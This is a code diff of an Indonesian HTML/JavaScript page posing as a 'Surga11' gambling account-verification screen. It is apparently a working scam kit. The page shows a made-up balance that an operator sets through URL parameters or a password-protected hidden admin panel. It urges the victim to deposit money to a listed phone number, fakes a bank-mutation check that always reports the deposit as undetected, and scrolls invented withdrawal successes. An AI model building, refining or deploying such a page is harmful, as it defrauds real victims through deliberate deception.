@@ -6,152 +6,346 @@
 <title>Sistem Verifikasi Surga11</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
+    /* CSS ASLI TANPA PERUBAHAN */
     * {margin:0; padding:0; box-sizing:border-box;}
-    body { min-height: 100vh; font-family: 'Inter', sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-    .card { width: 92%; max-width: 380px; background: #121212; border: 1px solid #333; border-radius: 25px; padding: 70px 20px 30px 20px; text-align: center; position: relative; box-shadow: 0 0 50px rgba(0,0,0,1); }
-    .brand-logo-custom { position: absolute; top: 25px; left: 20px; text-align: left; line-height: 1; }
-    .blue-part { color: #007bff; text-shadow: 1px 1px #fff; font-weight: 900; font-size: 20px; font-style: italic;}
-    .gold-box { color: #ffd700; background: #ff4500; padding: 1px 4px; border-radius: 4px; margin-left: 2px; font-weight: 900; font-size: 20px; font-style: italic;}
-    .icon-wrapper { position: relative; display: inline-block; margin-top: 10px; }
-    .top-icon { font-size: 60px; color: #ff4500; filter: drop-shadow(0 0 15px #ff4500); animation: pulseShield 2s infinite; }
-    .notif-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: #ff0000; border-radius: 50%; border: 1.5px solid #ff4500; }
-    @keyframes pulseShield { 0%, 100% { transform: scale(1); opacity: 0.9; } 50% { transform: scale(1.05); opacity: 1; } }
-    .status-box { font-size: 11px; font-weight: 900; color: #ff4500; text-transform: uppercase; margin-bottom: 25px; animation: alertBlink 0.8s infinite; }
-    @keyframes alertBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-    .balance-card { background: linear-gradient(180deg, #0d47a1, #1976d2); border-radius: 15px; padding: 20px; margin-bottom: 25px; }
-    .balance-value { font-size: 24px; font-weight: 800; }
-    .btn { width: 100%; padding: 16px; border-radius: 15px; font-size: 16px; font-weight: 800; cursor: pointer; display: block; margin-bottom: 15px; border: none;}
-    .btn-gold { background: #ffd700; color: #000; }
-    .btn-outline { background: transparent; color: #00c853; border: 1px solid #00c853; font-size: 12px; text-decoration: none;}
     
-    /* MODALS */
-    .modal, #loadingOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
-    .radar { width: 60px; height: 60px; border: 2px solid #ffd700; border-radius: 50%; position: relative; animation: rot 1s linear infinite; }
-    @keyframes rot { to { transform: rotate(360deg); } }
-    .modal-box { background: #fff; padding: 25px; border-radius: 15px; text-align: left; width: 85%; max-width: 320px; color: #333; }
-    .footer { position: fixed; bottom: 0; left: 0; width: 100%; height: 40px; background: #000; border-top: 1px solid #ff4500; overflow: hidden; display: flex; align-items: center; }
-    .scroller { white-space: nowrap; position: absolute; animation: move 120s linear infinite; color: #ff4500; font-weight: 700; font-size: 13px; }
-    @keyframes move { from { transform: translateX(0); } to { transform: translateX(-50%); } }
+    body {
+        height: 100vh;
+        font-family: 'Inter', sans-serif;
+        background: #000;
+        color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        overflow: hidden;
+    }
 
-    /* ADMIN PANEL HIDDEN */
-    #adminPanel { display: none; width: 92%; max-width: 380px; background: #1a1a1a; margin-top: 20px; padding: 20px; border-radius: 15px; border: 1px solid #ffd700; }
-    .admin-input { width: 100%; padding: 10px; margin-bottom: 10px; background: #333; border: 1px solid #444; color: #fff; border-radius: 5px; }
+    .card {
+        width: 90%;
+        max-width: 380px;
+        background: #121212;
+        border: 1px solid #333;
+        border-radius: 25px;
+        padding: 30px 20px;
+        text-align: center;
+        position: relative;
+    }
+
+    .icon-wrapper {
+        position: relative;
+        display: inline-block;
+        margin-bottom: 15px;
+        cursor: pointer;
+    }
+    .top-icon {
+        font-size: 55px;
+        color: #ff4500;
+        animation: pulseShield 2s infinite;
+    }
+    .notif-dot {
+        position: absolute;
+        top: 5px;
+        right: 5px;
+        width: 14px;
+        height: 14px;
+        background: #ff0000;
+        border-radius: 50%;
+        border: 2px solid #121212;
+    }
+    @keyframes pulseShield {
+        0%, 100% { transform: scale(1); filter: drop-shadow(0 0 5px #ff4500); }
+        50% { transform: scale(1.05); filter: drop-shadow(0 0 15px #ff4500); }
+    }
+
+    h1 { font-size: 24px; font-weight: 800; color: #ffd700; letter-spacing: 3px; margin-bottom: 5px; }
+
+    .status-box { 
+        font-size: 11px; 
+        font-weight: 900; 
+        color: #ff4500; 
+        text-transform: uppercase; 
+        margin-bottom: 20px; 
+        letter-spacing: 2px;
+        animation: alertBlink 1s infinite;
+    }
+    @keyframes alertBlink {
+        0%, 100% { color: #ff4500; text-shadow: 0 0 5px #ff4500; }
+        50% { color: #fff; text-shadow: 0 0 15px #ff4500; }
+    }
+
+    .message { font-size: 13px; line-height: 1.6; color: #aaa; margin-bottom: 20px; }
+
+    .balance-card {
+        background: linear-gradient(180deg, #0d47a1, #1976d2);
+        border-radius: 15px; padding: 18px; margin-bottom: 25px;
+        border: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .user-id-display {
+        font-size: 11px;
+        font-weight: 800;
+        color: #ffd700;
+        background: rgba(0,0,0,0.3);
+        display: inline-block;
+        padding: 4px 12px;
+        border-radius: 20px;
+        margin-bottom: 10px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    .balance-label { font-size: 9px; text-transform: uppercase; color: rgba(255,255,255,0.7); margin-bottom: 5px; }
+    .balance-value { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+
+    .realtime-clock {
+        font-size: 10px;
+        color: rgba(255, 255, 255, 0.8);
+        font-family: 'Courier New', Courier, monospace;
+        border-top: 1px solid rgba(255, 255, 255, 0.2);
+        padding-top: 8px;
+        display: block;
+    }
+
+    .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 15px; font-weight: 700; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; }
+    .btn-gold { background: #ffd700; color: #000; }
+    .btn-outline { background: transparent; color: #00c853; border: 1px solid #00c853; font-size: 12px; text-transform: uppercase; }
+
+    .admin-panel {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.95);
+        z-index: 3000;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    .admin-box {
+        background: #222;
+        padding: 20px;
+        border-radius: 15px;
+        width: 100%;
+        max-width: 300px;
+        border: 1px solid #ffd700;
+    }
+    .admin-box input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border-radius: 5px;
+        border: 1px solid #444;
+        background: #111;
+        color: #fff;
+    }
+    .admin-close {
+        color: #ff4500;
+        font-size: 12px;
+        cursor: pointer;
+        margin-top: 15px;
+        text-decoration: underline;
+    }
+
+    .ssl-secured {
+        display: flex; justify-content: center; align-items: center; gap: 8px;
+        font-size: 10px; color: #555; text-transform: uppercase; margin-top: 10px; margin-bottom: 20px;
+    }
+    .ssl-secured i { color: #00c853; }
+
+    .pay-icons { display: flex; justify-content: center; gap: 20px; opacity: 0.3; font-size: 20px; }
+
+    #loadingOverlay {
+        display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000;
+        flex-direction: column; justify-content: center; align-items: center;
+    }
+    .radar { width: 80px; height: 80px; border: 2px solid #ffd700; border-radius: 50%; position: relative; margin-bottom: 20px; }
+    .radar::after { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.4)); border-radius: 50%; animation: rot 1s linear infinite; }
+    @keyframes rot { to { transform: rotate(360deg); } }
+
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 999; justify-content: center; align-items: center; }
+    .modal-box { background: #111; padding: 25px; border-radius: 15px; border: 1px solid #ffd700; text-align: center; width: 85%; max-width: 320px; }
+    .btn-ok { background: transparent; color: #007bff; border: none; font-size: 17px; font-weight: bold; float: right; margin-top: 5px; cursor: pointer; }
+
+    .footer { position: fixed; bottom: 0; left: 0; width: 100%; height: 40px; background: #000; display: flex; align-items: center; border-top: 1px solid #ff4500; overflow: hidden; }
+    .scroller { white-space: nowrap; position: absolute; animation: move 120s linear infinite; color: #ff4500; font-weight: 700; font-size: 12px; }
+    @keyframes move { from { transform: translateX(0); } to { transform: translateX(-50%); } }
 </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="brand-logo-custom">
-        <span class="blue-part">SURGA</span><span class="gold-box">11</span>
+<div class="admin-panel" id="adminPanel">
+    <div class="admin-box">
+        <h2 style="color:#ffd700; font-size:16px; margin-bottom:10px;">ADMIN PANEL</h2>
+        <label style="font-size:10px;">UBAH USER ID:</label>
+        <input type="text" id="inputUser" placeholder="Contoh: kenzo283">
+        <label style="font-size:10px;">UBAH SALDO:</label>
+        <input type="text" id="inputSaldo" placeholder="Contoh: 3.150.275,00">
+        <button class="btn btn-gold" style="padding:10px; font-size:12px;" onclick="updateDataRealtime()">UPDATE DATA</button>
+        <center><div class="admin-close" onclick="closeAdmin()">Tutup Panel</div></center>
     </div>
+</div>
 
-    <div class="icon-wrapper">
+<div id="loadingOverlay">
+    <div class="radar"></div>
+    <div id="loadText" style="color:#ffd700; font-weight:bold;">MENGHUBUNGKAN...</div>
+</div>
+
+<div class="card">
+    <div class="icon-wrapper" onclick="handleSecretClick()">
         <i class="fas fa-shield-alt top-icon"></i>
         <div class="notif-dot"></div>
     </div>
-    <div class="status-box" id="displayStatus">Status Akun Terkunci</div>
+    <h1>SURGA11</h1>
+    <div class="status-box">Status Akun Terkunci</div>
     
-    <p style="font-size: 13px; color: #bbb; margin-bottom: 20px;">
-        ID Akun: <span id="userIdDisplay" style="color:#fff; font-weight:bold;">SURGA11_USER</span><br>
-        Segera lakukan deposit minimal 1x Rp 100.000 untuk membuka kunci akun anda.
-    </p>
+    <div class="message">Akun anda belum memiliki riwayat deposit claim bonus, segera lakukan deposit minimal 1x Rp 100.000 untuk membuka dan mengaktifkan kembali akun anda.</div>
 
     <div class="balance-card">
-        <div id="adminTrigger" style="font-size:10px; color:rgba(255,255,255,0.7); cursor:pointer;">JUMLAH SALDO ANDA</div>
+        <div class="user-id-display" id="displayId">ID: KENZO283</div>
+        <div class="balance-label">JUMLAH SALDO ANDA</div>
         <div class="balance-value" id="displaySaldo">Rp 3.150.275,00</div>
+        <div id="liveTime" class="realtime-clock">Memuat waktu...</div>
     </div>
     
-    <button class="btn btn-gold" onclick="openPayment()">Verifikasi & Buka Kunci</button>
-    <a href="#" class="btn btn-outline">KEMBALI LOGIN</a>
-</div>
+    <button class="btn btn-gold" onclick="showModal('payModal', true)">Verifikasi & Buka Kunci</button>
+    <a href="https://l4.surga11-login.com/register" class="btn btn-outline">Kembali Login ke Surga11</a>
 
-<div id="adminPanel">
-    <h3 style="color:#ffd700; text-align:center; margin-bottom:15px; font-size:14px;">⚙️ ADMIN CONTROL PANEL</h3>
-    <input type="text" id="setUserId" class="admin-input" placeholder="Ubah User ID">
-    <input type="text" id="setSaldo" class="admin-input" placeholder="Ubah Saldo (Contoh: 15.000.000)">
-    <input type="text" id="setNomor" class="admin-input" placeholder="Ubah Nomor Tujuan">
-    <button class="btn btn-gold" style="padding:10px; font-size:12px;" onclick="generateLink()">DAPATKAN LINK SALDO</button>
-</div>
+    <div class="ssl-secured">
+        <i class="fas fa-lock"></i> SECURED BY 256-BIT SSL ENCRYPTION
+    </div>
 
-<div id="loadingOverlay"><div class="radar"></div><div style="color:#ffd700; margin-top:10px;">MENGECEK...</div></div>
-<div class="modal" id="payModal">
-    <div class="modal-box" style="background:#111; color:#fff; text-align:center; border: 1px solid #ffd700;">
-        <div style="color:#ffd700; font-size:10px; margin-bottom:10px;">TUJUAN DEPOSIT</div>
-        <div id="modalNomor" style="background:#222; padding:15px; color:#ff3d00; font-weight:bold; font-size:24px; border:1px dashed #ffd700;">083194887061</div>
-        <button class="btn btn-gold" style="margin-top:15px;" onclick="check()">SAYA SUDAH TRANSFER</button>
+    <div class="pay-icons">
+        <i class="fa-solid fa-qrcode"></i>
+        <i class="fa-solid fa-building-columns"></i>
+        <i class="fa-solid fa-wallet"></i>
+        <i class="fa-brands fa-cc-visa"></i>
     </div>
 </div>
-<div class="modal" id="errorModal">
+
+<div class="modal" id="payModal">
     <div class="modal-box">
-        <h2 style="font-size:16px; border-bottom:1px solid #eee; padding-bottom:10px;">Info Akun</h2>
-        <p style="margin-top:10px;">Saldo belum terdeteksi. Silahkan ulangi deposit.</p>
-        <button style="float:right; color:#007bff; border:none; background:none; font-weight:bold; margin-top:15px; cursor:pointer;" onclick="location.reload()">OKE</button>
+        <h2 style="color:#ffd700; font-size:16px; margin-bottom:15px;">METODE VERIFIKASI</h2>
+        <div style="background:#ffd700; color:#000; padding:5px; border-radius:5px; font-size:10px; font-weight:900; margin-bottom:10px;">TUJUAN DEPOSIT ANDA</div>
+        <div style="background:#222; padding:15px; border-radius:10px; color:#ff3d00; font-weight:bold; font-size:24px; border:1px dashed #ffd700; margin-bottom:20px;">083194887061</div>
+        <button class="btn btn-gold" onclick="processValidation()">SAYA SUDAH TRANSFER</button>
+    </div>
+</div>
+
+<div class="modal" id="errorModal">
+    <div class="modal-box" style="background:#fff; color:#000; text-align:left; border:none;">
+        <h2 style="font-size:18px; border-bottom:1px solid #eee; padding-bottom:10px; margin-bottom:15px;">Info Akun Surga 11</h2>
+        <p style="font-size: 14px; color: #333; margin-bottom: 15px;">Mohon maaf, system belum mendeteksi deposit anda. Silahkan deposit kembali.</p>
+        <button class="btn-ok" onclick="showModal('errorModal', false)">OKE</button>
+        <div style="clear:both;"></div>
     </div>
 </div>
 
 <div class="footer"><div class="scroller" id="scrollText"></div></div>
 
 <script>
-    // FUNGSI LOAD DATA DARI URL
-    window.onload = function() {
-        const params = new URLSearchParams(window.location.search);
-        if(params.get('saldo')) {
-            document.getElementById('displaySaldo').innerText = "Rp " + params.get('saldo') + ",00";
-        }
-        if(params.get('user')) {
-            document.getElementById('userIdDisplay').innerText = params.get('user');
-        }
-        if(params.get('nomor')) {
-            document.getElementById('modalNomor').innerText = params.get('nomor');
-        }
-    };
+    // FITUR BARU: AUTO AMBIL DATA DARI LINK URL
+    function checkUrlParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const userParam = urlParams.get('user');
+        const saldoParam = urlParams.get('saldo');
 
-    // FITUR RAHASIA ADMIN (KETUK 6 KALI)
+        if (userParam) {
+            document.getElementById('displayId').innerText = "ID: " + userParam.toUpperCase();
+        }
+        if (saldoParam) {
+            let formatSaldo = saldoParam;
+            if (!formatSaldo.includes("Rp")) formatSaldo = "Rp " + formatSaldo;
+            document.getElementById('displaySaldo').innerText = formatSaldo;
+        }
+    }
+    // Jalankan fungsi saat web dibuka
+    window.addEventListener('load', checkUrlParams);
+
+    // LOGIKA ADMIN PANEL (KLIK 5X)
     let clickCount = 0;
-    document.getElementById('adminTrigger').onclick = function() {
+    function handleSecretClick() {
         clickCount++;
-        if(clickCount === 6) {
+        if (clickCount === 5) {
             let pass = prompt("Masukkan Password Admin:");
-            if(pass === "surga11") {
-                document.getElementById('adminPanel').style.display = 'block';
-                window.scrollTo(0, document.body.scrollHeight);
+            if (pass === "surga11") {
+                document.getElementById('adminPanel').style.display = 'flex';
             } else {
-                alert("Salah!");
+                alert("Password Salah!");
             }
             clickCount = 0;
         }
-    };
-
-    function generateLink() {
-        const u = document.getElementById('setUserId').value;
-        const s = document.getElementById('setSaldo').value;
-        const n = document.getElementById('setNomor').value;
-        
-        let link = window.location.href.split('?')[0] + "?";
-        if(u) link += "user=" + u + "&";
-        if(s) link += "saldo=" + s + "&";
-        if(n) link += "nomor=" + n;
-        
-        prompt("Salin link ini untuk digunakan:", link);
+        setTimeout(() => { clickCount = 0; }, 2000);
     }
 
-    function openPayment() { document.getElementById('payModal').style.display = 'flex'; }
-    function check() {
-        document.getElementById('payModal').style.display = 'none';
+    function closeAdmin() {
+        document.getElementById('adminPanel').style.display = 'none';
+    }
+
+    function updateDataRealtime() {
+        let newId = document.getElementById('inputUser').value;
+        let newSaldo = document.getElementById('inputSaldo').value;
+
+        if (newId) {
+            document.getElementById('displayId').innerText = "ID: " + newId.toUpperCase();
+        }
+        if (newSaldo) {
+            if (!newSaldo.includes("Rp")) newSaldo = "Rp " + newSaldo;
+            document.getElementById('displaySaldo').innerText = newSaldo;
+        }
+        closeAdmin();
+    }
+
+    // FUNGSI WAKTU REAL-TIME (WIB)
+    function updateClock() {
+        const now = new Date();
+        const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
+        const months = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
+        const dayName = days[now.getDay()];
+        const date = now.getDate();
+        const month = months[now.getMonth()];
+        const year = now.getFullYear();
+        const hours = String(now.getHours()).padStart(2, '0');
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+        const timeString = `${dayName}, ${date} ${month} ${year} | ${hours}:${minutes}:${seconds} WIB`;
+        document.getElementById('liveTime').innerText = timeString;
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    function showModal(id, x) { document.getElementById(id).style.display = x ? 'flex' : 'none'; }
+
+    // PROSES VALIDASI DENGAN LOADING RADAR
+    function processValidation() {
+        showModal('payModal', false);
         document.getElementById('loadingOverlay').style.display = 'flex';
-        setTimeout(() => { 
-            document.getElementById('loadingOverlay').style.display = 'none'; 
-            document.getElementById('errorModal').style.display = 'flex'; 
-        }, 3000);
+        setTimeout(() => { document.getElementById('loadText').innerText = "MENGECEK MUTASI BANK..."; }, 1500);
+        setTimeout(() => { document.getElementById('loadText').innerText = "SINKRONISASI DATABASE..."; }, 3000);
+        setTimeout(() => { document.getElementById('loadingOverlay').style.display = 'none'; showModal('errorModal', true); }, 4000);
     }
 
-    const names = ["Andi","Sari","Agus","Dewi","Rudi","Maya","Dwi","Ayu","Rian","Lina"];
-    let txt = "";
-    names.forEach(n => {
-        let val = new Intl.NumberFormat('id-ID').format(Math.floor(Math.random() * 20000000) + 3000000);
-        txt += ` • ${n}${Math.floor(Math.random()*900)} SUCCESS WD Rp ${val} &nbsp;&nbsp;&nbsp; `;
-    });
-    document.getElementById('scrollText').innerHTML = txt + txt;
+    // RUNNING TEXT (HISTORY WD)
+    function initHistory() {
+        const names = ["Eka","Budi","Sari","Agus","Dewi","Rudi","Maya","Dwi","Ayu","Rian","Lina","Yoga","Fajar","Nina","Andi","Santi","Deni","Heri","Rizki","Putra","Bayu","Indah","Putri","Dimas","Wati","Joko","Ani","Bambang","Ratna","Slamet"];
+        let savedData = sessionStorage.getItem('historyData');
+        if (!savedData) {
+            let str = "";
+            for (let i = names.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [names[i], names[j]] = [names[j], names[i]];
+            }
+            names.forEach((name, index) => {
+                let id = Math.floor(Math.random() * 899) + 100;
+                let baseWd = (index * 1200000) + (Math.floor(Math.random() * 800000)) + 3000000;
+                let val = new Intl.NumberFormat('id-ID').format(baseWd);
+                str += `&bull; ${name}${id} SUCCESS WD Rp ${val} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; `;
+            });
+            sessionStorage.setItem('historyData', str);
+            document.getElementById('scrollText').innerHTML = str + str;
+        } else {
+            document.getElementById('scrollText').innerHTML = savedData + savedData;
+        }
+    }
+    initHistory();
 </script>
 </body>
 </html>
